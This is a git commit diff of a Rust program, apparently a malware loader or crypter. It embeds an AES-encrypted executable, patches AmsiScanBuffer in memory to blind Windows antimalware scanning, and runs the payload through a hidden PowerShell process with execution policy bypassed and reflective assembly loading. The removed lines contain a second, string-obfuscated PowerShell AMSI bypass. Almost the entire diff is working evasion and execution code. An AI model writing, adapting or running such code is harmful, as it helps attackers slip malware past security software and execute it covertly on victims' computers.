776bebddc49c40e005162ff51053b83643801ec2
Jaxii <jaxmontelongo@gmail.com>
2022-05-20 13:04:02 -0500

    built-in amsi bypass, improved powershell command handler

--- src/main.rs
+++ src/main.rs
@@ -1,14 +1,64 @@
+use std::os::windows::process::CommandExt;
 use base64;
-use include_crypt::{EncryptedFile, include_crypt};
-use include_crypt::obfstr::obfconst;
+use include_crypt::{EncryptedFile, include_crypt, obfstr::obfconst};
 use obfstr::obfstr;
-use powershell_script::PsScriptBuilder;
+use std::process::Command;
+use std::{ffi::CString, ptr};
+
+use winapi::{
+    um::{
+        memoryapi::{
+            VirtualProtect,
+            WriteProcessMemory
+        },
+        libloaderapi::{
+            LoadLibraryA,
+            GetProcAddress
+        },
+        processthreadsapi::GetCurrentProcess,
+        winnt::PAGE_READWRITE
+    },
+    shared::{
+        minwindef::{
+            DWORD,
+            FALSE
+        },
+        ntdef::NULL
+    }
+};
 
 fn xref() -> &'static EncryptedFile {
     static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\Desktop\\File.exe");
     obfstr::xref!(&FILE)
 }
 
+fn patch() {
+
+    unsafe {
+        // Credits to https://github.com/trickster0/OffensiveRust/tree/master/amsi_bypass
+        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
+        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
+        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
+        let mut old_permissions: DWORD = 0;
+
+        // Overwrite this address with nops.
+        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
+            panic!("{}", obfstr!("[-] Failed to change protection."));
+        }
+        let written: *mut usize = ptr::null_mut();
+
+        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
+            panic!("{}", obfstr!("[-] Failed to overwrite function."));
+        }
+
+        // Restoring the permissions.
+        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
+        println!("{}", obfstr!("[+] AmsiScanBuffer patched!"));
+
+    }
+
+
+}
 fn main() {
 
     //  use litcrypt::{lc, use_litcrypt};
@@ -17,17 +67,21 @@ fn main() {
 
     let new = base64::encode(xref().decrypt());
 
-    let script = obfstr!("[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
-    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + new.as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
-    let ps = PsScriptBuilder::new()
-        .no_profile(true)
-        .non_interactive(true)
-        .hidden(true)
-        .print_commands(false)
-        .build();
-    let _output = ps.run(script.as_str()).unwrap();
-
+    let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + new.as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
+        patch();
+        if let Ok(_command) = Command::new("powershell")
+            .arg("-NoProfile")
+            .arg("-WindowStyle")
+            .arg("Hidden")
+            .arg("-ExecutionPolicy")
+            .arg("Bypass")
+            .arg("-Command")
+            .arg(script)
+            .creation_flags(0x08000000)
+           // .creation_flags(0x00000001)
+            .output()
+        {
+            println!("{}",obfstr!("success!"))
+        }
 }
-
-
 //
